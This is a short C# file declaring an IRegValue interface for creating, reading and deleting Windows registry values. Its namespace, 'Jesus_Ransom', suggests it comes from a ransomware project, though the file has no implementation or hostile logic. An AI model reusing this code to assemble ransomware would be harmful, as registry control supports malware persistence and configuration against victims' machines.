using System.Text;

namespace Jesus_Ransom;

public interface IRegValue
{
	void CreateBinary(string name, byte[] value);

	void CreateBinary(string name, string value, Encoding encoding);

	void CreateDWord(string name, int value);

	void CreateExpandString(string name, string value);

	void CreateMultiString(string name, string[] value);

	void CreateQWord(string name, int value);

	void CreateString(string name, string value);

	void CreateUnknown(string name, object value);

	void Delete(string name);

	string[] GetNames();

	object GetValue(string name);

	void Dispose();
}
